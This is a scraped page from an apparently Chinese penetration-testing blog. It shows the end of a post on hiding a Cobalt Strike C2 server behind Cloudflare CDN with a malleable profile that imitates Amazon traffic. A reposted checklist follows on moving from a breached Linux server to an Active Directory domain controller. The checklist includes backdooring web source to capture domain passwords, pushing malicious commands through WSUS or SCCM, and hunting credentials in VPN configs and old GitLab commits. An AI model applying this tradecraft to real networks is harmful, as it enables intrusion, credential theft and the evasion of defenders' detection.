&#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text/xml&quot;;</span><br><span class="line">        header &quot;X-Requested-With&quot; &quot;XMLHttpRequest&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;www.amazon.com&quot;;</span><br><span class="line"></span><br><span class="line">        parameter &quot;sz&quot; &quot;160x600&quot;;</span><br><span class="line">        parameter &quot;oe&quot; &quot;oe=ISO-8859-1;&quot;;        id &#123;</span><br><span class="line">            parameter &quot;sn&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parameter &quot;s&quot; &quot;3717&quot;;</span><br><span class="line">        parameter &quot;dc_ref&quot; &quot;http%3A%2F%2Fwww.amazon.com&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            base64;            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Server&quot; &quot;Server&quot;;</span><br><span class="line">        header &quot;x-amz-id-1&quot; &quot;THK9YEZJCKPGY5T42OZT&quot;;</span><br><span class="line">        header &quot;x-amz-id-2&quot; &quot;a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo=&quot;;</span><br><span class="line">        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;</span><br><span class="line">        header &quot;x-ua-compatible&quot; &quot;IE=edge&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>随后将这个profile文件上传到服务器上面去，加载这个profile文件</p>
<p><code>./teamserver ip 密码 ./profile</code></p>
<h1 id="实验能否上线"><a href="#实验能否上线" class="headerlink" title="实验能否上线"></a>实验能否上线</h1><p><img src="/2023/03/03/c2%E6%9C%8D%E5%8A%A1%E5%99%A8CDN%E9%9A%90%E8%97%8F/image-20230303190918151.png" alt="image-20230303190918151"></p>
<p>然后创建一个监听器</p>
<p>打码的地方填写自己的域名，因为cloudflare的原因这里端口的设置需要注意以下：<br>若是http，则只能设置80,8080,8880,2052,2082,2086,2095这些端口号<br>若是https，则只能443,2053,2083,2087,2096,8443 这些端口号</p>
<p>其中的httphost记得填写自己的域名。</p>
<p><img src="/2023/03/03/c2%E6%9C%8D%E5%8A%A1%E5%99%A8CDN%E9%9A%90%E8%97%8F/image-20230303191111328.png" alt="image-20230303191111328"></p>
<p>成功使用cdn上线，而且可以看到外网ip是不断在变化的。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/02/19/%E9%80%9A%E8%BF%87linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91%E5%90%8E%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BE%BE%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="十三">
      <meta itemprop="description" content="潜心学习，不骄不躁">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="十三の博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/19/%E9%80%9A%E8%BF%87linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91%E5%90%8E%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BE%BE%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">通过linux服务器进入内网后如何快速达到域控的思路总结</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-02-19 13:12:01 / 修改时间：13:12:24" itemprop="dateCreated datePublished" datetime="2023-02-19T13:12:01+08:00">2023-02-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/penetration/" itemprop="url" rel="index"><span itemprop="name">-penetration</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="通过linux服务器进入内网后如何快速达到域控的思路总结"><a href="#通过linux服务器进入内网后如何快速达到域控的思路总结" class="headerlink" title="通过linux服务器进入内网后如何快速达到域控的思路总结"></a><strong>通过linux服务器进入内网后如何快速达到域控的思路总结</strong></h1><p>此文章为转发，方便日后查阅。</p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv20125695">通过linux服务器进入内网后如何快速达到域控的思路总结 - 哔哩哔哩 (bilibili.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux服务器的resolve.conf 中dns可能会设置为域控</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查/etc/krb5.conf  </span><br><span class="line"></span><br><span class="line">Azure 中的vm可以通过配置kerberos将vm加入托管域，使Azure AD域账户通过ssh登录linux服务器</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查smb.conf / 查mnt cifs挂载</span><br><span class="line"></span><br><span class="line">linux 主机连接windows 445 smb共享文件夹有两种方式，一种是通过samba-client客户端，一种是通过mount cifs去挂载共享文件夹的cifs文件系统，可以查看samba-client 的配置文件，或者查看.bash_history查看连接历史，这里连接的大概率不是域控主机，但可能是域内的nas或域内的服务器，小概率会是开发的测试机，不管怎么样，都离我们的目标更近了一步，而且nas里面有敏感信息正常吗，很正常啊</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">找ad登录验证的web服务器</span><br><span class="line"></span><br><span class="line">在大型组织的内网，很可能存在通过域进行身份验证的服务器，包括但不限于通过ad账号验证的erp、crm系统、邮箱系统或域账号管控系统，通过web端口扫描找到对应的服务器并尝试对web系统、数据库弱口令等各种姿势去getshell，在进入内网后的众多web系统中可以提高对他的渗透优先级</span><br><span class="line"></span><br><span class="line">拿到后可以在web源码或配置文件中找到ad服务器的ip端口等信息，如果数据库保存了账号密码明文很好，但大概率是加密后的账号密码，可以改源码加个后门把域账号密码明文保存下来</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">找ad账号验证的vdi管控或登录系统（Crtrix ADC、Vcenter、国内某些厂商的VDI管控平台等等）</span><br><span class="line"></span><br><span class="line">这里的vdi系统其实也是套web系统，但因为这些网络设备如果是登录系统拿到shell权限后大概率会跨网段进入域控和vdi主机所在的网段，如果是管控系统的话，如果都是vdi主机组的域，那基本就结束了，所以单独拿出来说一下。拿到对应的服务器权限后一般都会有一个本地与域控服务器通信的域控账号将设备注册到域控中，密码不出意外都是加密的，这里吹一波msf，在cs烂大街的情况下，还是有一堆痴心不改的老外愿意把这些关键设备的配置文件解密脚本更新到msf的插件中</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">找WSUS服务器/EDR终端管控服务器/SCCM服务器</span><br><span class="line"></span><br><span class="line">WSUS就是windows推送更新补丁包的服务器，拿到之后可以给域控分发补丁（exe或恶意命令）然后打域控，当然不是扫135看到WSUS就一定有域，这玩意也能放到工作组里用</span><br><span class="line"></span><br><span class="line">SCCM是 Microsoft 的一种解决方案，可在整个组织中以可扩展的方式增强管理。SCCM 允许大量功能，包括将 PowerShell 脚本推送到其客户端、将命令推送到其客户端、在客户端上打开远程终端会话、在其客户端上安装软件、更改其客户端上的策略等等。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano/cat /var/log/secure</span><br><span class="line"></span><br><span class="line">emm...如果拿到内网web系统，查下端口访问，可能能看到办公机访问的ip或办公网网关ip，对所在网段389或636,3268,3269（GC服务）端口扫描可能会有收获</span><br><span class="line"></span><br><span class="line">查看ssh连接历史的ip也是一个意思，快速定位可达windows主机的IP段，尽量少在内网大的网段扫描探测</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">135端口扫描</span><br><span class="line"></span><br><span class="line">OXID find是yyds啦</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openvpn配置文件</span><br><span class="line"></span><br><span class="line">适用的环境比较奇怪，现在的云主机比较多嘛，有时候源码在内网的gitlab上，或者有些其他需要与内网资源交互的奇特场景，会给服务器上配个vpn，拿到账号密码ip端口就去连内网去搞内网渗透去了，像vpn账号嘛、邮箱账号嘛、sso账号嘛和域控账号密码一毛一样很正常嘛，如果能在主机上能翻到ADFS sso账号简直中奖好嘛，这一块主要看操作的人在主机上留了什么东西了</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gitlab信息收集</span><br><span class="line"></span><br><span class="line">就像前面说的内网存在一些需要ad验证的web系统，如果拿到gitlab之类的源码平台搜索关键字ldap在源码中、注释中可能会找到测试的ad账号和服务器地址，如果最新的版本中找不到，记得在老的commit中翻一下，git系统的位置可以在拿到权限的服务器源码的.git的config之类的配置文件中找</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/18/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><span class="page-number current">19</span><a class="page-number" href="/page/20/">20</a><span class="space">&hellip;</span><a class="page-number" href="/page/58/">58</a><a class="extend next" rel="next" href="/page/20/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="十三"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">十三</p>
  <div class="site-description" itemprop="description">潜心学习，不骄不躁</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">173</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">十三</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tsumiki"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/src/clicklove.js"></script>
